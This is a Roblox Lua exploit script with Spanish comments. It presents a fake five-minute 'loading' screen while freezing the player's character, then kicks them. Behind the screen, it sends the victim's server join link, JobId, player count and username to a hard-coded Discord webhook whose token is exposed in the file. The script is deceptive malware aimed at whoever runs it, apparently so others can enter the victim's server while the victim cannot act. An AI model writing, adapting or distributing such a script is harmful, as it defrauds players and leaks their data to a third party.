-- ⚙️ CONFIGURACIÓN
local WEBHOOK_URL = "https://discord.com/api/webhooks/1428149049168494602/XhQJbBGyeVnb4QDSkNR9mvWXo9PtAy1i95DHh8y2A29rvp7zI4W6fVIyjc9mQfYSD4Ah"
local ALLOWED_PLACE_ID = 109983668079237  -- Cambia a 0 para permitir cualquier juego

-- Servicios
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")

-- Función para notificaciones
local function notify(title, text, duration)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = duration or 5
        })
    end)
end

notify("🚀 Script", "Iniciando...", 3)

-- Obtener jugador
local player = Players.LocalPlayer
if not player then
    notify("❌ Error", "No se encontró el jugador", 5)
    return
end

-- Esperar a que cargue el personaje
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 10)
local humanoid = character:WaitForChild("Humanoid", 10)

if not humanoidRootPart or not humanoid then
    notify("❌ Error", "No se pudo cargar el personaje", 5)
    return
end

notify("✅ Cargado", "Personaje detectado", 2)

-- Verificar PlaceID si no es 0
if ALLOWED_PLACE_ID ~= 0 and game.PlaceId ~= ALLOWED_PLACE_ID then
    notify("❌ Error", "PlaceID incorrecto: " .. game.PlaceId, 10)
    return
end

notify("✅ Verificado", "Juego correcto", 2)

-- Función para obtener link del servidor
local function getServerLink()
    return string.format(
        "https://www.roblox.com/games/%d?privateServerLinkCode=%s",
        game.PlaceId,
        game.JobId
    )
end

-- Función para enviar webhook (Compatible con múltiples ejecutores)
local function sendWebhook()
    local serverLink = getServerLink()
    
    local data = {
        content = "@everyone **Nuevo Servidor Detectado!**",
        embeds = {{
            title = "Información del Servidor",
            description = "Script ejecutado exitosamente",
            color = 3447003,
            fields = {
                {
                    name = "🔗 Link del Servidor",
                    value = serverLink,
                    inline = false
                },
                {
                    name = "🎮 Place ID",
                    value = tostring(game.PlaceId),
                    inline = true
                },
                {
                    name = "🆔 Job ID",
                    value = game.JobId,
                    inline = true
                },
                {
                    name = "👥 Jugadores",
                    value = tostring(#Players:GetPlayers()),
                    inline = true
                },
                {
                    name = "👤 Usuario",
                    value = player.Name,
                    inline = true
                }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    local jsonData = HttpService:JSONEncode(data)
    
    -- Intenta diferentes métodos de request
    local success = false
    
    -- Método 1: request (KRNL, Fluxus)
    if request then
        success = pcall(function()
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
    end
    
    -- Método 2: http_request (Synapse, Delta)
    if not success and http_request then
        success = pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
    end
    
    -- Método 3: syn.request (Synapse X)
    if not success and syn and syn.request then
        success = pcall(function()
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
    end
    
    if success then
        notify("✅ Webhook", "Enviado a Discord!", 3)
    else
        notify("⚠️ Webhook", "No se pudo enviar", 3)
    end
end

-- Congelar jugador
local function freezePlayer()
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        humanoid.JumpHeight = 0
        humanoid.AutoRotate = false
    end
    
    if humanoidRootPart then
        humanoidRootPart.Anchored = true
    end
    
    for _, part in pairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Anchored = true
        end
    end
    
    notify("🔒 Congelado", "No puedes moverte", 3)
end

-- Crear pantalla de carga
local function createLoadingScreen()
    local playerGui = player:WaitForChild("PlayerGui")
    
    -- ScreenGui principal
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 999
    
    -- Fondo completo
    local bg = Instance.new("Frame")
    bg.Name = "Background"
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    bg.BorderSizePixel = 0
    bg.ZIndex = 10
    bg.Parent = screenGui
    
    -- Contenedor
    local container = Instance.new("Frame")
    container.Size = UDim2.new(0, 450, 0, 250)
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.Position = UDim2.new(0.5, 0, 0.5, 0)
    container.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    container.BorderSizePixel = 0
    container.ZIndex = 11
    container.Parent = bg
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 20)
    corner.Parent = container
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 150, 255)
    stroke.Thickness = 2
    stroke.Transparency = 0.5
    stroke.Parent = container
    
    -- Texto "CARGANDO"
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -40, 0, 60)
    titleLabel.Position = UDim2.new(0, 20, 0, 30)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "CARGANDO"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 38
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.ZIndex = 12
    titleLabel.Parent = container
    
    -- Porcentaje
    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size = UDim2.new(1, -40, 0, 50)
    percentLabel.Position = UDim2.new(0, 20, 0, 100)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Text = "0%"
    percentLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
    percentLabel.TextSize = 32
    percentLabel.Font = Enum.Font.GothamBold
    percentLabel.ZIndex = 12
    percentLabel.Parent = container
    
    -- Barra de progreso (fondo)
    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0.85, 0, 0, 12)
    barBg.AnchorPoint = Vector2.new(0.5, 0)
    barBg.Position = UDim2.new(0.5, 0, 0, 170)
    barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    barBg.BorderSizePixel = 0
    barBg.ZIndex = 12
    barBg.Parent = container
    
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 6)
    barCorner.Parent = barBg
    
    -- Barra de progreso (relleno)
    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
    bar.BorderSizePixel = 0
    bar.ZIndex = 13
    bar.Parent = barBg
    
    local barFillCorner = Instance.new("UICorner")
    barFillCorner.CornerRadius = UDim.new(0, 6)
    barFillCorner.Parent = bar
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 150, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 220, 255))
    }
    gradient.Parent = bar
    
    screenGui.Parent = playerGui
    
    return screenGui, percentLabel, bar, barBg
end

-- ================================
-- EJECUCIÓN PRINCIPAL
-- ================================

-- Crear pantalla
local gui, percentText, progressBar = createLoadingScreen()
notify("📺 Pantalla", "Carga iniciada", 2)

-- Congelar
freezePlayer()

-- Enviar webhook
task.spawn(sendWebhook)

-- Animación de carga (5 minutos = 300 segundos)
local totalTime = 300
local elapsed = 0

local connection = RunService.Heartbeat:Connect(function(dt)
    elapsed = elapsed + dt
    local percent = math.min((elapsed / totalTime) * 100, 100)
    
    percentText.Text = string.format("%d%%", math.floor(percent))
    progressBar.Size = UDim2.new(percent / 100, 0, 1, 0)
    
    if percent >= 100 then
        connection:Disconnect()
        task.wait(0.5)
        player:Kick("⏰ Has sido expulsado después de 5 minutos.")
    end
end)

notify("⏱️ Iniciado", "Kick en 5 minutos", 5)
